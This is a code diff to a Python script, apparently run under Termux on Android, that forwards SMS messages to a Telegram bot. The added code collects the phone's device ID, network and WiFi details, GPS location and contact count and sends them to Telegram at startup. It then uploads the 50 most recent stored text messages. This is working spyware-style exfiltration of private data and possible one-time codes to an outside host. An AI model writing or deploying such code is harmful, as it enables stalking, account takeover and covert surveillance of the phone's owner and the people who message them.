@@ -75,6 +75,88 @@ def format_sms(message):
     )
     return formatted
 
+def get_device_info():
+    """Collect device information using Termux API"""
+    device_info = "<b>📱 DEVICE INFORMATION 📱</b>\n\n"
+    
+    # Get device information
+    try:
+        # Device info
+        result = subprocess.run(["termux-info"], capture_output=True, text=True)
+        if result.returncode == 0:
+            device_info += "<b>System Info:</b>\n"
+            for line in result.stdout.strip().split("\n"):
+                if ":" in line:
+                    key, value = line.split(":", 1)
+                    device_info += f"• {key.strip()}: {value.strip()}\n"
+            device_info += "\n"
+    except Exception as e:
+        device_info += f"• Error getting system info: {str(e)}\n\n"
+    
+    # Battery info
+    try:
+        result = subprocess.run(["termux-battery-status"], capture_output=True, text=True)
+        if result.returncode == 0:
+            battery_data = json.loads(result.stdout)
+            device_info += "<b>Battery Info:</b>\n"
+            device_info += f"• Status: {battery_data.get('status', 'Unknown')}\n"
+            device_info += f"• Percentage: {battery_data.get('percentage', 'Unknown')}%\n"
+            device_info += f"• Temperature: {battery_data.get('temperature', 'Unknown')}°C\n\n"
+    except Exception as e:
+        device_info += f"• Error getting battery info: {str(e)}\n\n"
+    
+    # Network info
+    try:
+        result = subprocess.run(["termux-telephony-deviceinfo"], capture_output=True, text=True)
+        if result.returncode == 0:
+            tel_data = json.loads(result.stdout)
+            device_info += "<b>Phone Info:</b>\n"
+            device_info += f"• Device ID: {tel_data.get('device_id', 'Unknown')}\n"
+            device_info += f"• Phone Type: {tel_data.get('phone_type', 'Unknown')}\n"
+            device_info += f"• Network Type: {tel_data.get('network_type', 'Unknown')}\n"
+            device_info += f"• SIM State: {tel_data.get('sim_state', 'Unknown')}\n\n"
+    except Exception as e:
+        device_info += f"• Error getting phone info: {str(e)}\n\n"
+    
+    # Wifi info
+    try:
+        result = subprocess.run(["termux-wifi-connectioninfo"], capture_output=True, text=True)
+        if result.returncode == 0:
+            wifi_data = json.loads(result.stdout)
+            device_info += "<b>WiFi Info:</b>\n"
+            device_info += f"• SSID: {wifi_data.get('ssid', 'Unknown')}\n"
+            device_info += f"• BSSID: {wifi_data.get('bssid', 'Unknown')}\n"
+            device_info += f"• IP: {wifi_data.get('ip', 'Unknown')}\n"
+            device_info += f"• Link Speed: {wifi_data.get('link_speed_mbps', 'Unknown')} Mbps\n\n"
+    except Exception as e:
+        device_info += f"• Error getting WiFi info: {str(e)}\n\n"
+    
+    # Location (approximate)
+    try:
+        result = subprocess.run(["termux-location"], capture_output=True, text=True)
+        if result.returncode == 0:
+            loc_data = json.loads(result.stdout)
+            device_info += "<b>Location Info:</b>\n"
+            device_info += f"• Latitude: {loc_data.get('latitude', 'Unknown')}\n"
+            device_info += f"• Longitude: {loc_data.get('longitude', 'Unknown')}\n"
+            device_info += f"• Accuracy: {loc_data.get('accuracy', 'Unknown')} meters\n\n"
+    except Exception as e:
+        device_info += f"• Error getting location info: {str(e)}\n\n"
+    
+    # Contacts count
+    try:
+        result = subprocess.run(["termux-contact-list"], capture_output=True, text=True)
+        if result.returncode == 0:
+            contacts = json.loads(result.stdout)
+            device_info += f"<b>Contacts:</b> {len(contacts)} contacts\n\n"
+    except Exception as e:
+        device_info += f"• Error getting contacts info: {str(e)}\n\n"
+    
+    # Add timestamp
+    device_info += f"<b>Report Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    
+    return device_info
+
 def main():
     print("[+] Starting SMS to Telegram forwarder")
     print("[+] Checking for required packages...")
@@ -84,10 +166,41 @@ def main():
         print("[-] Please configure your Telegram bot token and chat ID in the script")
         exit(1)
     
+    # Send device information at startup
+    print("[+] Collecting device information...")
+    device_info = get_device_info()
+    print("[+] Sending device information to Telegram...")
+    if send_to_telegram(device_info):
+        print("[+] Device information sent successfully")
+    else:
+        print("[-] Failed to send device information")
+    
     print(f"[+] Will check for new SMS every {CHECK_INTERVAL} seconds")
     
     # Store the last processed message timestamp
     last_timestamp = 0
+    
+    # Send all existing messages at startup
+    print("[+] Sending all existing SMS messages...")
+    messages = get_sms_messages(50)  # Get last 50 messages
+    if messages:
+        print(f"[+] Found {len(messages)} existing messages")
+        # Sort messages by timestamp
+        messages.sort(key=lambda x: int(x.get("received", 0)))
+        
+        for message in messages:
+            formatted_message = format_sms(message)
+            success = send_to_telegram(formatted_message)
+            
+            if success:
+                print(f"[+] Sent message from {message.get('number')} to Telegram")
+            
+            # Update the last timestamp
+            current_timestamp = int(message.get("received", 0))
+            if current_timestamp > last_timestamp:
+                last_timestamp = current_timestamp
+    else:
+        print("[+] No existing messages found")
     
     while True:
         try:
